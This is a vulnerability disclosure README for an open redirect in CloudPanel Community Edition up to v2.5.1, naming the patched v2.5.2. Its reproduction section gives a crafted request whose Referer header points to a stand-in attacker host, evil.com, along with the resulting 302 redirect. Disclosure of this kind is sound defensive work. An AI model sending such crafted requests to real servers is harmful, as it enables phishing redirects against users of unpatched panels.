# Open Redirect via Referer Header
<table>
  <tr>
    <td width="150" rowspan="2">
      <a href="https://github.com/cloudpanel-io/cloudpanel-ce" target="_blank">
        <img src="https://avatars.githubusercontent.com/u/53903112?v=4" alt="Eigenfocus Logo" width="120"/>
      </a>
    </td>
    <td>
      <h1>Cloudpanel - Community Edition</h1>
      <h3> A free and modern server control panel</h3>
    </td>
  </tr>
  <tr>
    <td>
      <table>
        <tr>
          <td>
            🔗 <a href="https://github.com/cloudpanel-io/cloudpanel-ce" target="_blank">CloudPanel CE Github Repository</span></a>
          </td>
          <td style="padding-left: 15px;">
            🚀 <a href="https://github.com/cloudpanel-io/cloudpanel-ce/releases/tag/v2.5.2" target="_blank"> Patched Version (v2.5.2) </span></a>
          </td>
        </tr>
      </table>
    </td>
  </tr>
</table>

## 📜 Description
CloudPanel Community Edition (CE) ≤ v2.5.1 is affected by an Open Redirect vulnerability in the `/admin/users` endpoint, where the application improperly trusts the Referer HTTP header to determine redirect destinations. By supplying a crafted external URL in the Referer header, an attacker can cause the application to issue a 302 redirect to an arbitrary domain, enabling phishing attacks that can mislead users into believing they are interacting with a legitimate CloudPanel login page while actually being redirected to a malicious website.

## 🔍 Affected Versions

| Status       | Version         |
|--------------|-----------------|
| 🔴 Vulnerable |  ≤ `2.5.1`      |
| 🟢  Fixed     |  &nbsp;&nbsp;`2.5.2`      |   

## 🛠️ Steps to Reproduce

#### 1️⃣ Send the following HTTP request to the vulnerable endpoint:
```
GET /admin/users HTTP/2
Host: <cloudpanel-ip>
Referer: https://evil.com
```

#### 2️⃣ Observe the server response:

```
HTTP/2 302 Found
Location: https://evil.com
```

## ⚠️ Disclaimer
This project is intended for **educational and ethical research purposes only**. Unauthorized testing on systems without explicit permission is illegal. Use responsibly and only on systems you own or have permission to test.

## 🧑‍💻 Discovery

This vulnerability was discovered by **Alex Perrakis** (Stolichnayer).

## 🔗 References:
- [CloudPanel Github Repository](https://github.com/cloudpanel-io/cloudpanel-ce)
- [Patched Version (v2.5.2)](https://github.com/cloudpanel-io/cloudpanel-ce/releases/tag/v2.5.2)
